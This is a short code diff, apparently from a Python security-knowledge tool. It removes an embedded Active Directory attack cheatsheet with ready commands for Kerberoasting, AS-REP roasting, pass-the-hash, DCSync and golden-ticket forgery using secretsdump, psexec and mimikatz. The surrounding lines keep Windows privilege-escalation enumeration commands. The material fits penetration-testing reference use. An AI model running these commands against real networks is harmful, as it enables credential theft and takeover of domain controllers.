@@ -282,31 +282,6 @@ reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer  # AlwaysInsta
 Get-WmiObject Win32_Service | Where-Object {$_.State -eq 'Running'}  # Services
 winpeas.exe for automated enum
 """, "privilege-escalation"),
-        "ad-attacks": ("""
-Active Directory Attack Cheatsheet:
-# Kerberoasting
-GetUserSPNs.py domain/user:pass -dc-ip DC -request
-hashcat -m 13100 hashes.txt wordlist.txt
-
-# AS-REP Roasting
-GetNPUsers.py domain/ -usersfile users.txt -format hashcat
-hashcat -m 18200 hashes.txt wordlist.txt
-
-# Pass the Hash
-secretsdump.py domain/user@TARGET
-psexec.py -hashes :NTHASH domain/admin@TARGET
-
-# BloodHound collection
-SharpHound.exe -c All
-bloodhound-python -u user -p pass -ns DC_IP -d domain -c all
-
-# DCSync
-secretsdump.py domain/admin@DC_IP
-mimikatz # lsadump::dcsync /user:Administrator
-
-# Golden Ticket
-mimikatz # kerberos::golden /user:admin /domain:domain /sid:S-1-5 /krbtgt:HASH /ptt
-""", "active-directory"),
     }
     builtin_total = 0
     for name, (text, domain) in builtin.items():
